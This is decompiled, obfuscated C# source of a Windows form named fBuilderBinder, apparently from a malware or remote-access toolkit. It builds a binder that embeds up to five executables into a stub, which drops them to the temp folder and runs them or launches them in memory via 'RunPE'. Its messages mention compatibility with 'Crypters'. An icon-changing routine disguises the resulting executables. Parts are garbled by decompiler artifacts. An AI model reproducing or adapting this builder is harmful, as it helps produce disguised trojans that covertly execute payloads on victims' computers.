﻿using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x02000123 RID: 291
[DesignerGenerated]
public sealed partial class fBuilderBinder : Form
{
	// Token: 0x0600104E RID: 4174 RVA: 0x0000973E File Offset: 0x0000793E
	public fBuilderBinder()
	{
		base.Closing += this.fBuilderBinder_Closing;
		this.InitializeComponent();
	}

	// Token: 0x06001051 RID: 4177 RVA: 0x0000975E File Offset: 0x0000795E
	internal GClass7 vmethod_0()
	{
		return this.gclass7_0;
	}

	// Token: 0x06001052 RID: 4178 RVA: 0x0007A5AC File Offset: 0x000787AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(GClass7 gclass7_1)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_9);
		GClass7 gclass = this.gclass7_0;
		if (gclass != null)
		{
			gclass.MouseUp -= value;
		}
		this.gclass7_0 = gclass7_1;
		gclass = this.gclass7_0;
		if (gclass != null)
		{
			gclass.MouseUp += value;
		}
	}

	// Token: 0x06001053 RID: 4179 RVA: 0x00009766 File Offset: 0x00007966
	internal VisualButton vmethod_2()
	{
		return this.visualButton_0;
	}

	// Token: 0x06001054 RID: 4180 RVA: 0x0007A5F0 File Offset: 0x000787F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(VisualButton visualButton_3)
	{
		EventHandler value = new EventHandler(this.method_3);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_3;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06001055 RID: 4181 RVA: 0x0000976E File Offset: 0x0000796E
	internal RadioButton vmethod_4()
	{
		return this.radioButton_0;
	}

	// Token: 0x06001056 RID: 4182 RVA: 0x00009776 File Offset: 0x00007976
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(RadioButton radioButton_2)
	{
		this.radioButton_0 = radioButton_2;
	}

	// Token: 0x06001057 RID: 4183 RVA: 0x0000977F File Offset: 0x0000797F
	internal RadioButton vmethod_6()
	{
		return this.radioButton_1;
	}

	// Token: 0x06001058 RID: 4184 RVA: 0x00009787 File Offset: 0x00007987
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(RadioButton radioButton_2)
	{
		this.radioButton_1 = radioButton_2;
	}

	// Token: 0x06001059 RID: 4185 RVA: 0x00009790 File Offset: 0x00007990
	internal PictureBox vmethod_8()
	{
		return this.pictureBox_0;
	}

	// Token: 0x0600105A RID: 4186 RVA: 0x0007A634 File Offset: 0x00078834
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(PictureBox pictureBox_2)
	{
		EventHandler value = new EventHandler(this.method_1);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_0 = pictureBox_2;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x0600105B RID: 4187 RVA: 0x00009798 File Offset: 0x00007998
	internal PictureBox vmethod_10()
	{
		return this.pictureBox_1;
	}

	// Token: 0x0600105C RID: 4188 RVA: 0x0007A678 File Offset: 0x00078878
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(PictureBox pictureBox_2)
	{
		EventHandler value = new EventHandler(this.method_0);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_2;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x0600105D RID: 4189 RVA: 0x000097A0 File Offset: 0x000079A0
	internal VisualButton vmethod_12()
	{
		return this.visualButton_1;
	}

	// Token: 0x0600105E RID: 4190 RVA: 0x0007A6BC File Offset: 0x000788BC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(VisualButton visualButton_3)
	{
		EventHandler value = new EventHandler(this.method_5);
		VisualButton visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_1 = visualButton_3;
		visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600105F RID: 4191 RVA: 0x000097A8 File Offset: 0x000079A8
	internal ContextMenuStrip vmethod_14()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x06001060 RID: 4192 RVA: 0x000097B0 File Offset: 0x000079B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(ContextMenuStrip contextMenuStrip_1)
	{
		this.contextMenuStrip_0 = contextMenuStrip_1;
	}

	// Token: 0x06001061 RID: 4193 RVA: 0x000097B9 File Offset: 0x000079B9
	internal ToolStripMenuItem vmethod_16()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x06001062 RID: 4194 RVA: 0x0007A700 File Offset: 0x00078900
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(ToolStripMenuItem toolStripMenuItem_3)
	{
		EventHandler value = new EventHandler(this.method_6);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_0;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_0 = toolStripMenuItem_3;
		toolStripMenuItem = this.toolStripMenuItem_0;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001063 RID: 4195 RVA: 0x000097C1 File Offset: 0x000079C1
	internal ToolStripSeparator vmethod_18()
	{
		return this.toolStripSeparator_0;
	}

	// Token: 0x06001064 RID: 4196 RVA: 0x000097C9 File Offset: 0x000079C9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(ToolStripSeparator toolStripSeparator_2)
	{
		this.toolStripSeparator_0 = toolStripSeparator_2;
	}

	// Token: 0x06001065 RID: 4197 RVA: 0x000097D2 File Offset: 0x000079D2
	internal ToolStripMenuItem vmethod_20()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x06001066 RID: 4198 RVA: 0x0007A744 File Offset: 0x00078944
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(ToolStripMenuItem toolStripMenuItem_3)
	{
		EventHandler value = new EventHandler(this.method_8);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_1 = toolStripMenuItem_3;
		toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001067 RID: 4199 RVA: 0x000097DA File Offset: 0x000079DA
	internal ToolStripSeparator vmethod_22()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x06001068 RID: 4200 RVA: 0x000097E2 File Offset: 0x000079E2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(ToolStripSeparator toolStripSeparator_2)
	{
		this.toolStripSeparator_1 = toolStripSeparator_2;
	}

	// Token: 0x06001069 RID: 4201 RVA: 0x000097EB File Offset: 0x000079EB
	internal ToolStripMenuItem vmethod_24()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x0600106A RID: 4202 RVA: 0x0007A788 File Offset: 0x00078988
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(ToolStripMenuItem toolStripMenuItem_3)
	{
		EventHandler value = new EventHandler(this.method_7);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_2 = toolStripMenuItem_3;
		toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600106B RID: 4203 RVA: 0x000097F3 File Offset: 0x000079F3
	internal CheckBox vmethod_26()
	{
		return this.checkBox_0;
	}

	// Token: 0x0600106C RID: 4204 RVA: 0x000097FB File Offset: 0x000079FB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(CheckBox checkBox_1)
	{
		this.checkBox_0 = checkBox_1;
	}

	// Token: 0x0600106D RID: 4205 RVA: 0x00009804 File Offset: 0x00007A04
	internal VisualButton vmethod_28()
	{
		return this.visualButton_2;
	}

	// Token: 0x0600106E RID: 4206 RVA: 0x0007A7CC File Offset: 0x000789CC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(VisualButton visualButton_3)
	{
		EventHandler value = new EventHandler(this.method_10);
		VisualButton visualButton = this.visualButton_2;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_2 = visualButton_3;
		visualButton = this.visualButton_2;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600106F RID: 4207 RVA: 0x0000980C File Offset: 0x00007A0C
	public static bool smethod_0(string string_0, string string_1)
	{
		return fBuilderBinder.smethod_1(string_0, string_1, 1U, 1U);
	}

	// Token: 0x06001070 RID: 4208 RVA: 0x0007A810 File Offset: 0x00078A10
	public static bool smethod_1(string string_0, string string_1, uint uint_0, uint uint_1)
	{
		fBuilderBinder.Class133 @class = fBuilderBinder.Class133.smethod_0(string_1);
		IntPtr intptr_ = fBuilderBinder.Class134.BeginUpdateResource(string_0, false);
		byte[] array = @class.method_2(uint_1);
		bool result;
		if (!fBuilderBinder.Class134.UpdateResource(intptr_, new IntPtr(14L), new IntPtr((long)((ulong)uint_0)), 0, array, array.Length))
		{
			result = false;
		}
		else
		{
			checked
			{
				int num = @class.method_0() - 1;
				for (int i = 0; i <= num; i++)
				{
					byte[] array2 = @class.method_1(i);
					if (!fBuilderBinder.Class134.UpdateResource(intptr_, new IntPtr(3L), new IntPtr((long)(unchecked((ulong)uint_1) + (ulong)(unchecked((long)i)))), 0, array2, array2.Length))
					{
						return false;
					}
				}
				fBuilderBinder.Class134.EndUpdateResource(intptr_, false);
				result = true;
			}
		}
		return result;
	}

	// Token: 0x06001071 RID: 4209 RVA: 0x00009817 File Offset: 0x00007A17
	private void method_0(object sender, EventArgs e)
	{
		Interaction.MsgBox("The file will be dropped to Temp directory (%temp%) with a random filename and then executed.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001072 RID: 4210 RVA: 0x0000982B File Offset: 0x00007A2B
	private void method_1(object sender, EventArgs e)
	{
		Interaction.MsgBox("The file will be executed in memory using classic RunPE method.\r\n\r\nNOTE: This option may not be compatible with all Crypters. \r\nMake sure to test it!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001073 RID: 4211 RVA: 0x0007A8B4 File Offset: 0x00078AB4
	public void method_2()
	{
		if (this.vmethod_0().Columns.Count == 0)
		{
			this.vmethod_0().Columns.Add("File", "File");
			this.vmethod_0().Columns.Add("Size", "Size");
			this.vmethod_0().Columns.Add("Path", "Path");
			this.vmethod_0().Columns.Add("Execution", "Execution");
			this.vmethod_0().Columns.Add("Run once", "Run once");
			this.vmethod_0().Columns[0].Width = 120;
			this.vmethod_0().Columns[1].Width = 80;
			this.vmethod_0().Columns[2].Width = 220;
			this.vmethod_0().Columns[3].Width = 120;
			this.vmethod_0().Columns[4].Width = 80;
		}
		this.vmethod_0().GridLines = Class135.smethod_0().Gridlines;
		base.Opacity = 100.0;
	}

	// Token: 0x06001074 RID: 4212 RVA: 0x0000983F File Offset: 0x00007A3F
	private void method_3(object sender, EventArgs e)
	{
		this.method_4();
	}

	// Token: 0x06001075 RID: 4213 RVA: 0x0007A9FC File Offset: 0x00078BFC
	private void method_4()
	{
		if (this.vmethod_0().Items.Count >= 5)
		{
			Interaction.MsgBox("Maximum 5 files are allowed!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		using (OpenFileDialog openFileDialog = new OpenFileDialog())
		{
			openFileDialog.Multiselect = false;
			openFileDialog.InitialDirectory = Application.StartupPath;
			openFileDialog.Title = "Select a 32-bit Executable (.exe) file";
			openFileDialog.Filter = "Exe Files (*.exe*)|*.exe";
			openFileDialog.FilterIndex = 1;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				byte[] bytes = File.ReadAllBytes(openFileDialog.FileName);
				string @string = Encoding.UTF8.GetString(bytes);
				if (Operators.CompareString(@string.Substring(0, 2), "MZ", true) != 0)
				{
					Interaction.MsgBox("Not a valid PE/Executable file!", MsgBoxStyle.Critical, Application.ProductName);
				}
				if (this.vmethod_4().Checked & Class136.smethod_54(openFileDialog.FileName))
				{
					Interaction.MsgBox("Executable is not 32-bit!\r\nA 32-bit executable is required for execution in memory.", MsgBoxStyle.Critical, Application.ProductName);
				}
				else if ((((-((this.vmethod_4().Checked > false) ? 1 : 0)) ? 1 : 0) & Strings.InStr(@string.ToLower(), "mscoree.dll", CompareMethod.Text)) != 0)
				{
					Interaction.MsgBox("Not a native executable file!\r\nA native executable is required for execution in memory.", MsgBoxStyle.Critical, Application.ProductName);
				}
				else
				{
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = Path.GetFileName(openFileDialog.FileName);
					listViewItem.Tag = openFileDialog.FileName;
					ListViewItem.ListViewSubItemCollection subItems = listViewItem.SubItems;
					OpenFileDialog openFileDialog2;
					string fileName = (openFileDialog2 = openFileDialog).FileName;
					double num = (double)Class136.smethod_32(ref fileName);
					openFileDialog2.FileName = fileName;
					double num2 = num;
					bool flag = false;
					ref bool ptr = ref flag;
					double num3 = num2;
					ListViewItem.ListViewSubItemCollection listViewSubItemCollection = subItems;
					int num4;
					string text2;
					int num5;
					object obj;
					try
					{
						ProjectData.ClearProjectError();
						num4 = 2;
						string text = string.Empty;
						if (num3 >= 1099511627776.0)
						{
							text = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num3 >= 1073741824.0)
						{
							text = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num3 >= 1048576.0)
						{
							text = Strings.Format(num3 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num3 >= 1024.0)
						{
							text = Strings.Format(num3 / 1024.0, "#0.00") + " KiB";
						}
						else if (num3 < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num3)) + " B";
						}
						if (ptr)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
						}
						IL_2DF:
						goto IL_32F;
						IL_2E1:
						text2 = "0 B";
						goto IL_2DF;
						IL_2EA:
						num5 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
						IL_300:;
					}
					catch when (endfilter(obj is Exception & num4 != 0 & num5 == 0))
					{
						Exception ex = (Exception)obj2;
						goto IL_2EA;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_32F:
					if (num5 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string text3 = text2;
					listViewSubItemCollection.Add(text3);
					listViewItem.SubItems.Add(openFileDialog.FileName);
					NewLateBinding.LateCall(listViewItem.SubItems, null, "Add", new object[]
					{
						Interaction.IIf(this.vmethod_4().Checked, "Memory", "Disk")
					}, null, null, null, true);
					NewLateBinding.LateCall(listViewItem.SubItems, null, "Add", new object[]
					{
						Interaction.IIf(this.vmethod_26().Checked, "Yes", "No")
					}, null, null, null, true);
					this.vmethod_0().Items.Add(listViewItem);
				}
			}
		}
	}

	// Token: 0x06001076 RID: 4214 RVA: 0x0007AE28 File Offset: 0x00079028
	private void method_5(object sender, EventArgs e)
	{
		this.vmethod_12().Enabled = false;
		this.vmethod_0().Enabled = false;
		this.vmethod_2().Enabled = false;
		this.vmethod_4().Enabled = false;
		this.vmethod_6().Enabled = false;
		if (this.vmethod_0().Items.Count == 0)
		{
			Interaction.MsgBox("No files added! Please, add at least one file.", MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_12().Enabled = true;
			this.vmethod_0().Enabled = true;
			this.vmethod_2().Enabled = true;
			this.vmethod_4().Enabled = true;
			this.vmethod_6().Enabled = true;
			return;
		}
		string text = Conversions.ToString(this.vmethod_0().Items.Count) + "|";
		try
		{
			foreach (object obj in this.vmethod_0().Items)
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Interaction.IIf(Operators.CompareString(listViewItem.SubItems[3].Text, "Memory", true) == 0, "1", "0"), "-"), Interaction.IIf(Operators.CompareString(listViewItem.SubItems[4].Text, "Yes", true) == 0, Class136.smethod_38(8L), "0")), "|")));
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		checked
		{
			text = text.Substring(0, text.Length - 1);
			byte[] array = Class131.smethod_7();
			byte[] bytes = Encoding.UTF8.GetBytes(Class136.smethod_40(text));
			byte[] array2 = new byte[128];
			Array.Copy(bytes, 0, array2, 0, bytes.Length);
			Array.Copy(array2, 0, array, 208992, array2.Length);
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Executable |*.exe";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				string fileName = saveFileDialog.FileName;
				byte[] array3 = array;
				bool flag = true;
				byte[] byte_ = array3;
				string string_ = fileName;
				Class136.Class142 @class = new Class136.Class142();
				@class.string_0 = string_;
				@class.byte_0 = byte_;
				@class.bool_0 = false;
				try
				{
					if (flag)
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
					else
					{
						Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
					}
				}
				catch (Exception ex)
				{
				}
				try
				{
					foreach (object obj2 in this.vmethod_0().Items)
					{
						ListViewItem listViewItem2 = (ListViewItem)obj2;
						int num;
						num++;
						new UnicodeEncoding();
						switch (num)
						{
						case 1:
							Class136.smethod_55(saveFileDialog.FileName, Conversions.ToString(101), File.ReadAllBytes(Conversions.ToString(listViewItem2.Tag)));
							break;
						case 2:
							Class136.smethod_55(saveFileDialog.FileName, Conversions.ToString(102), File.ReadAllBytes(Conversions.ToString(listViewItem2.Tag)));
							break;
						case 3:
							Class136.smethod_55(saveFileDialog.FileName, Conversions.ToString(103), File.ReadAllBytes(Conversions.ToString(listViewItem2.Tag)));
							break;
						case 4:
							Class136.smethod_55(saveFileDialog.FileName, Conversions.ToString(104), File.ReadAllBytes(Conversions.ToString(listViewItem2.Tag)));
							break;
						case 5:
							Class136.smethod_55(saveFileDialog.FileName, Conversions.ToString(105), File.ReadAllBytes(Conversions.ToString(listViewItem2.Tag)));
							break;
						}
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				Interaction.MsgBox("File successfully saved to: " + saveFileDialog.FileName, MsgBoxStyle.Information, Application.ProductName);
			}
			else
			{
				Interaction.MsgBox("Operation cancelled!", MsgBoxStyle.Exclamation, Application.ProductName);
			}
			this.vmethod_12().Enabled = true;
			this.vmethod_0().Enabled = true;
			this.vmethod_2().Enabled = true;
			this.vmethod_4().Enabled = true;
			this.vmethod_6().Enabled = true;
		}
	}

	// Token: 0x06001077 RID: 4215 RVA: 0x0000983F File Offset: 0x00007A3F
	private void method_6(object sender, EventArgs e)
	{
		this.method_4();
	}

	// Token: 0x06001078 RID: 4216 RVA: 0x00009847 File Offset: 0x00007A47
	private void method_7(object sender, EventArgs e)
	{
		this.vmethod_0().Items.Clear();
	}

	// Token: 0x06001079 RID: 4217 RVA: 0x0007B298 File Offset: 0x00079498
	private void method_8(object sender, EventArgs e)
	{
		for (;;)
		{
			IL_00:
			try
			{
				foreach (object obj in this.vmethod_0().Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					if (listViewItem.Selected)
					{
						this.vmethod_0().Items.Remove(listViewItem);
						goto IL_00;
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			break;
		}
	}

	// Token: 0x0600107A RID: 4218 RVA: 0x00009859 File Offset: 0x00007A59
	private void method_9(object sender, MouseEventArgs e)
	{
		this.vmethod_20().Enabled = (this.vmethod_0().Items.Count > 0);
		this.vmethod_24().Enabled = (this.vmethod_0().Items.Count > 0);
	}

	// Token: 0x0600107B RID: 4219 RVA: 0x00007348 File Offset: 0x00005548
	private void fBuilderBinder_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x0600107C RID: 4220 RVA: 0x0007B310 File Offset: 0x00079510
	private void method_10(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		try
		{
			openFileDialog.Multiselect = false;
			openFileDialog.InitialDirectory = Application.StartupPath;
			openFileDialog.Title = "Select executable (.exe) file";
			openFileDialog.Filter = "Exe Files (*.exe*)|*.exe";
			openFileDialog.FilterIndex = 1;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				byte[] bytes = File.ReadAllBytes(openFileDialog.FileName);
				if (Operators.CompareString(Encoding.UTF8.GetString(bytes).Substring(0, 2), "MZ", true) != 0)
				{
					Interaction.MsgBox("Not a valid PE/Executable file!", MsgBoxStyle.Critical, Application.ProductName);
				}
				using (OpenFileDialog openFileDialog2 = new OpenFileDialog())
				{
					openFileDialog2.Multiselect = false;
					openFileDialog2.InitialDirectory = Application.StartupPath;
					openFileDialog2.Title = "Select icon (.ico) file";
					openFileDialog2.Filter = "Exe Files (*.ico*)|*.ico";
					openFileDialog2.FilterIndex = 1;
					if (openFileDialog2.ShowDialog() != DialogResult.OK)
					{
						Interaction.MsgBox("Operation cancelled!", MsgBoxStyle.Exclamation, Application.ProductName);
						return;
					}
					if (fBuilderBinder.smethod_0(openFileDialog.FileName, openFileDialog2.FileName))
					{
						Interaction.MsgBox("Icon successfully changed!\r\n\r\nNOTE: You may have to restart Explorer (explorer.exe) to see the changes in the icon.", MsgBoxStyle.Information, Application.ProductName);
						return;
					}
					Interaction.MsgBox("Icon changer failed!", MsgBoxStyle.Critical, Application.ProductName);
					return;
				}
			}
			Interaction.MsgBox("Operation cancelled!", MsgBoxStyle.Exclamation, Application.ProductName);
		}
		finally
		{
			((IDisposable)openFileDialog).Dispose();
		}
	}

	// Token: 0x0400065B RID: 1627
	private GClass7 gclass7_0;

	// Token: 0x0400065C RID: 1628
	private VisualButton visualButton_0;

	// Token: 0x0400065D RID: 1629
	private RadioButton radioButton_0;

	// Token: 0x0400065E RID: 1630
	private RadioButton radioButton_1;

	// Token: 0x0400065F RID: 1631
	private PictureBox pictureBox_0;

	// Token: 0x04000660 RID: 1632
	private PictureBox pictureBox_1;

	// Token: 0x04000661 RID: 1633
	private VisualButton visualButton_1;

	// Token: 0x04000662 RID: 1634
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x04000663 RID: 1635
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x04000664 RID: 1636
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x04000665 RID: 1637
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x04000666 RID: 1638
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x04000667 RID: 1639
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x04000668 RID: 1640
	private CheckBox checkBox_0;

	// Token: 0x04000669 RID: 1641
	private VisualButton visualButton_2;

	// Token: 0x02000124 RID: 292
	private struct Struct23
	{
		// Token: 0x0400066A RID: 1642
		public byte byte_0;

		// Token: 0x0400066B RID: 1643
		public byte byte_1;

		// Token: 0x0400066C RID: 1644
		public byte byte_2;

		// Token: 0x0400066D RID: 1645
		public byte byte_3;

		// Token: 0x0400066E RID: 1646
		public ushort ushort_0;

		// Token: 0x0400066F RID: 1647
		public ushort ushort_1;

		// Token: 0x04000670 RID: 1648
		public int int_0;

		// Token: 0x04000671 RID: 1649
		public int int_1;
	}

	// Token: 0x02000125 RID: 293
	private struct Struct24
	{
		// Token: 0x04000672 RID: 1650
		public uint uint_0;

		// Token: 0x04000673 RID: 1651
		public int int_0;

		// Token: 0x04000674 RID: 1652
		public int int_1;

		// Token: 0x04000675 RID: 1653
		public ushort ushort_0;

		// Token: 0x04000676 RID: 1654
		public ushort ushort_1;

		// Token: 0x04000677 RID: 1655
		public uint uint_1;

		// Token: 0x04000678 RID: 1656
		public uint uint_2;

		// Token: 0x04000679 RID: 1657
		public int int_2;

		// Token: 0x0400067A RID: 1658
		public int int_3;

		// Token: 0x0400067B RID: 1659
		public uint uint_3;

		// Token: 0x0400067C RID: 1660
		public uint uint_4;
	}

	// Token: 0x02000126 RID: 294
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	private struct Struct25
	{
		// Token: 0x0400067D RID: 1661
		public byte byte_0;

		// Token: 0x0400067E RID: 1662
		public byte byte_1;

		// Token: 0x0400067F RID: 1663
		public byte byte_2;

		// Token: 0x04000680 RID: 1664
		public byte byte_3;

		// Token: 0x04000681 RID: 1665
		public ushort ushort_0;

		// Token: 0x04000682 RID: 1666
		public ushort ushort_1;

		// Token: 0x04000683 RID: 1667
		public int int_0;

		// Token: 0x04000684 RID: 1668
		public ushort ushort_2;
	}

	// Token: 0x02000127 RID: 295
	private sealed class Class133
	{
		// Token: 0x0600107D RID: 4221 RVA: 0x00009897 File Offset: 0x00007A97
		private Class133()
		{
			this.struct26_0 = default(fBuilderBinder.Struct26);
		}

		// Token: 0x0600107E RID: 4222 RVA: 0x000098AB File Offset: 0x00007AAB
		public int method_0()
		{
			return (int)this.struct26_0.ushort_2;
		}

		// Token: 0x0600107F RID: 4223 RVA: 0x000098B8 File Offset: 0x00007AB8
		public byte[] method_1(int int_0)
		{
			return this.byte_0[int_0];
		}

		// Token: 0x06001080 RID: 4224 RVA: 0x0007B484 File Offset: 0x00079684
		public static fBuilderBinder.Class133 smethod_0(string string_0)
		{
			fBuilderBinder.Class133 @class = new fBuilderBinder.Class133();
			byte[] array = File.ReadAllBytes(string_0);
			GCHandle gchandle = GCHandle.Alloc(array, GCHandleType.Pinned);
			@class.struct26_0 = (fBuilderBinder.Struct26)Marshal.PtrToStructure(gchandle.AddrOfPinnedObject(), typeof(fBuilderBinder.Struct26));
			checked
			{
				@class.struct23_0 = new fBuilderBinder.Struct23[(int)(@class.struct26_0.ushort_2 - 1 + 1)];
				@class.byte_0 = new byte[(int)(@class.struct26_0.ushort_2 - 1 + 1)][];
				int num = Marshal.SizeOf<fBuilderBinder.Struct26>(@class.struct26_0);
				Type typeFromHandle = typeof(fBuilderBinder.Struct23);
				int num2 = Marshal.SizeOf(typeFromHandle);
				int num3 = (int)(@class.struct26_0.ushort_2 - 1);
				for (int i = 0; i <= num3; i++)
				{
					fBuilderBinder.Struct23 @struct = (fBuilderBinder.Struct23)Marshal.PtrToStructure(new IntPtr(gchandle.AddrOfPinnedObject().ToInt64() + unchecked((long)num)), typeFromHandle);
					@class.struct23_0[i] = @struct;
					@class.byte_0[i] = new byte[@struct.int_0 - 1 + 1];
					Buffer.BlockCopy(array, @struct.int_1, @class.byte_0[i], 0, @struct.int_0);
					num += num2;
				}
				gchandle.Free();
				return @class;
			}
		}

		// Token: 0x06001081 RID: 4225 RVA: 0x0007B5B0 File Offset: 0x000797B0
		public byte[] method_2(uint uint_0)
		{
			checked
			{
				byte[] array = new byte[Marshal.SizeOf(typeof(fBuilderBinder.Struct26)) + Marshal.SizeOf(typeof(fBuilderBinder.Struct25)) * this.method_0() - 1 + 1];
				GCHandle gchandle = GCHandle.Alloc(array, GCHandleType.Pinned);
				Marshal.StructureToPtr<fBuilderBinder.Struct26>(this.struct26_0, gchandle.AddrOfPinnedObject(), false);
				int num = Marshal.SizeOf<fBuilderBinder.Struct26>(this.struct26_0);
				int num2 = this.method_0() - 1;
				for (int i = 0; i <= num2; i++)
				{
					fBuilderBinder.Struct25 structure = default(fBuilderBinder.Struct25);
					fBuilderBinder.Struct24 @struct = default(fBuilderBinder.Struct24);
					GCHandle gchandle2 = GCHandle.Alloc(@struct, GCHandleType.Pinned);
					Marshal.Copy(this.method_1(i), 0, gchandle2.AddrOfPinnedObject(), Marshal.SizeOf(typeof(fBuilderBinder.Struct24)));
					gchandle2.Free();
					structure.byte_0 = this.struct23_0[i].byte_0;
					structure.byte_1 = this.struct23_0[i].byte_1;
					structure.byte_2 = this.struct23_0[i].byte_2;
					structure.byte_3 = this.struct23_0[i].byte_3;
					structure.ushort_0 = @struct.ushort_0;
					structure.ushort_1 = @struct.ushort_1;
					structure.int_0 = this.struct23_0[i].int_0;
					structure.ushort_2 = (ushort)(unchecked((ulong)uint_0) + (ulong)(unchecked((long)i)));
					Marshal.StructureToPtr<fBuilderBinder.Struct25>(structure, new IntPtr(gchandle.AddrOfPinnedObject().ToInt64() + unchecked((long)num)), false);
					num += Marshal.SizeOf(typeof(fBuilderBinder.Struct25));
				}
				gchandle.Free();
				return array;
			}
		}

		// Token: 0x04000685 RID: 1669
		private fBuilderBinder.Struct26 struct26_0;

		// Token: 0x04000686 RID: 1670
		private fBuilderBinder.Struct23[] struct23_0;

		// Token: 0x04000687 RID: 1671
		private byte[][] byte_0;
	}

